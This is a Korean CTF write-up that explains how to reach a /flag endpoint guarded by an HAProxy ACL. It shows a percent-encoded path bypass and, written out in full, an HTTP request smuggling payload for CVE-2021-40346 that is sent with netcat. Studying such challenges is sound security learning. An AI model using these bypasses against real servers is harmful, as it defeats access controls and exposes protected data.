---
layout: post
category: [wargame, web]
title: Smuggling
---

## [문제](https://h4ckingga.me/challenges#Smuggling-15)


## 문제 분석

문제 웹페이지 사진   
![main](/assets/img/2024-06-03-smuggling/main.png)

다양한 엔드포인트를 Bruteforce(?) 해보았으나 전부 404 오류가 발생하였다.. ``/admin`` ``/dashboard`` ``/login`` 등...

서버는 gunicorn을 사용한다는 것을 알 수 있었다.   
![gunicorn](/assets/img/2024-06-03-smuggling/server_info.png)

일단 문제에 주어진 서버 파일을 살펴보았다.

```py
# main.py
from flask import Flask

app = Flask(__name__)

flag = open("FLAG").read()

@app.route('/', methods=['GET', 'POST'])
def main():
    return 'Hello! Our Team is TeamH4C'

@app.route('/guest', methods=['GET', 'POST'])
def guest():
    return 'ref. jfrog'

@app.route('/flag', methods=['GET', 'POST'])
def get_flag():
	return flag


if __name__ == '__main__':
    app.run()
```

엔드포인트는 3개로 ``/guest`` ``/flag`` 가 있는 걸 확인할 수 있었다.

``/flag`` 엔드포인트에 접속해보았다.

![403](/assets/img/2024-06-03-smuggling/forbidden.png)

서버 소스에는 403 에러가 발생하는 부분이 없으나, ``/flag`` 엔드포인트에 접속하면 403 에러로 접근을 거부하고 있는 것을 알 수 있다.

서버 코드가 너무 심플하다. 서버에서 403을 일으키진 않는 것 같아 문제 파일을 조금 더 살펴보았다.

```yaml
# docker-compose.yaml
version: '3.7'
services:
  web:
    image: haproxy:2.2.16
    volumes:
      - ./config:/usr/local/etc/haproxy
    ports:
      - "10008:8000"
  flask:
    build: .
```

이 파이썬 앱은 ``docker-compose`` 를 이용하여 도커 환경의 서버에서 서빙되고 있는 것을 알 수 있다. 또한 파이썬 앱에 직접적으로 연결되는 것이 아닌 ``haproxy`` 라고 하는 리버스 프록시 뒤에서 작동하는 것을 확인하였다.

### 리버스 프록시란?
서버와 외부 인터넷 사이에 위치하여 서버로 들어오는 요청을 처리한다.
주로 로드 벨런싱, SSL Termination, 캐싱 등을 통해 웹 서버의 성능, 보안을 강화하는 데 사용된다.

![proxy](/assets/img/2024-06-03-smuggling/diagram.png)

다시 본문으로 돌아와서 ``config/haproxy.cfg`` 파일을 보면
```
frontend web 
    bind *:8000  
    http-request deny if { path_beg /flag }
    http-request deny if { path_beg // }
```
위 부분에서 ``path_beg`` 가 ``/flag`` 의 경우 http 요청을 거부하는 규칙이 있음을 알 수 있다.

또한 아래의 설정 구문을 보면, flask 호스트네임의 5000번으로 요청을 프록시하고 있는 것을 알 수 있다.
```
backend websrvs 
    http-reuse always
    server srv1 flask:5000
```

그래서 이제 haproxy가 ``/flag`` 엔드포인트에 접근을 막고 있는 것을 알게 되었다. 구글링 해볼 시간이다.

![구글신 만세](/assets/img/2024-06-03-smuggling/google.png)

검색 결과를 확인해보니 인코딩된 URL로 요청하면 통과가 가능하다는 글과
HAProxy 가 ACL(Access Control List) bypass 를 가능하게 한다는 레딧 글이 있다.


## Percent Encoding 으로 우회하여 해결하는 방법

[첫번째 글](https://discourse.haproxy.org/t/encoded-url-not-matching-path-beg-or-url-dec/6710) 에선 ``%44%43`` 이런 식으로 인코딩이 되어 있는 주소로 접근할 때에 ACL 바이패스가 가능하다는 글이였다.

이 글에서의 haproxy 버전은 ``2.2.8`` 로 dockerfile 에 명시된 ``haproxy:2.2.16`` 버전보다 높기 때문에 문제 페이지의 haproxy 는 취약할 것이라고 생각된다.

이를 통해 [인코딩](https://developer.mozilla.org/en-US/docs/Glossary/Percent-encoding) 된 URL 로 ``/flag`` 주소를 접근하면 플래그를 획득할 수 있다.

> Percent Encoding 이란?   
특별한 의미가 있는 8비트 문자를 URL 내에서 인코딩 할 때에 사용하는 방법이다.   
인코딩은 % 와 대체 문자의 ASCII 값에 대한 16진수 표현으로 구성된다.   
예를 들어 Hello 의 경우 ACSII 값으로 "72 101 108 108 111" 이고 이를 16진수 Hex로 바꿔서 각 Hex 에 %를 대입한 후 "%48 %65 %6c %6c %6f" 주소창에 입력하면 Hello 가 나오는 것을 볼 수 있다.

```js
const toEncode = "flag"
[...toEncode].map(e => e.charCodeAt()).map(e => "%" + e.toString(16)).join("")
```

위와 같은 자바스크립트 코드로 ``flag`` 를 Percent Encoding 으로 인코딩 후 ``/%66%6c%61%67`` 주소로 접근할 경우 플래그를 얻을 수 있다.

![FLAG](/assets/img/2024-06-03-smuggling/flag.png)

## HTTP Smugggling 으로 해결한 방법
[두번째 글](https://www.reddit.com/r/sysadmin/comments/pl5hjb/haproxy_vulnerability_allows_acl_bypass/) 의 경우, 이 글이 링크되어 있다.

[HAProxy vulnerability enables HTTP request smuggling attacks | The Daily Swig \(portswigger.net\)](https://portswigger.net/daily-swig/haproxy-vulnerability-enables-http-request-smuggling-attacks)

"Security researchers have disclosed a HTTP request smuggling vulnerability in HAProxy, the popular open source load balancer."
> 보안 연구원들이 인기 있는 오픈 소스 로드 밸런서인 HAProxy의 HTTP Request Smuggling 취약점을 공개했습니다.
   
"Researchers at DevOps platform JFrog demonstrated how an integer overflow flaw (CVE-2021-40346) can be abused to perform HTTP request smuggling attacks that bypass any access control lists (ACLs) defined in HAProxy."
> DevOps 플랫폼 JFrog의 연구원들은 정수 오버플로 결함(CVE-2021-40346) 을 악용하여 HAProxy에 정의된 ACL(액세스 제어 목록) 을 우회하는 HTTP Request Smuggling 공격을 수행할 수 있는 방법을 시연했습니다.

``JFrog의 연구원들`` 아까 서버 코드에 ref. jfrog 라고 적혀있는 게 힌트였던 것 같다.

### HTTP Smuggling 이란?

웹 서비스를 구축할 때 로드벨런싱, 캐싱 등을 위해 프록시를 배치하게 되는데, 프록시와 웹 서버가 서로 HTTP 요청의 Body 길이에 대한 해석을 다르게 하면서 주로 발생한다.

HTTP 의 Body 길이는 Content-Length 헤더, Transfer-Encoding 헤더를 통해 결정된다.

haproxy 는 사용자가 보낸 리퀘스트를 처리할때 `htx_add_header` 함수를 사용하는데, CVE-2021-40346 취약점에 영향을 받는 haproxy 버전에서는
헤더 길이 확인을 하지 않아 정수 오버플로우가 발생해 공격자가 HTTP 요청 스머글링을 수행할 수 있도록 한다.

Content-Length 헤더를 파싱하는 과정에서 헤더 이름이 256바이트를 초과하면 정수 오버플로우가 발생한다. 이로 인해 HAProxy는 헤더와 그 길이를 잘못 해석하여, 공격자가 변조된 요청을 통해 허가되지 않은 요청을 백엔드 서버로 전달할 수 있게 된다.

![haproxy vuln](/assets/img/2024-06-03-smuggling/diagram2.png)

공격 페이로드
```
POST /guest HTTP/1.1
Host: web.h4ckingga.me:10008
Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
Content-Length: 23

GET /flag HTTP/1.1
h:GET /guest HTTP/1.1
Host: web.h4ckingga.me:10008

```

페이로드는 [여기](https://github.com/donky16/CVE-2021-40346-POC) 를 참고하여 작성하였고, netcat 을 이용해 페이로드를 전송하였다.

![flag](/assets/img/2024-06-03-smuggling/flag_2.png)

``POST /guest HTTP/1.1`` 의 응답과 ACL 바이패스된 ``/flag`` 값이 나오는 것을 확인할 수 있다.
